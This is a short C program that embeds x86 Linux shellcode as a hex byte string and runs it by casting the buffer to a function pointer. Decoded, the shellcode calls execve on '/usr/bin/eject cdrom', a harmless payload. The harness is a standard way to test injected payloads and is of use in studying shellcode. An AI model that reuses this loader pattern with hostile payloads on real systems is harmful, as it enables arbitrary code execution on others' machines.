#include<stdio.h>
#include<string.h>
unsigned char code[] = \
"\x6a\x0b\x58\x99\x52"
"\x6a\x6d\x68\x63\x64"
"\x72\x6f\x89\xe1\x52"
"\x66\x68\x63\x74\x68"
"\x2f\x65\x6a\x65\x68"
"\x2f\x62\x69\x6e\x68"
"\x2f\x75\x73\x72\x89"
"\xe3\x52\x51\x53\x89"
"\xe1\xcd\x80\x40\xcd"
"\x80";

main()
{
	printf("Press ENTER key to Continue\n");
	getchar();
	printf("Payload shellcode Lenght: %d\n", strlen(code));
	int (*ret)() = (int(*)())code;

	ret();

}
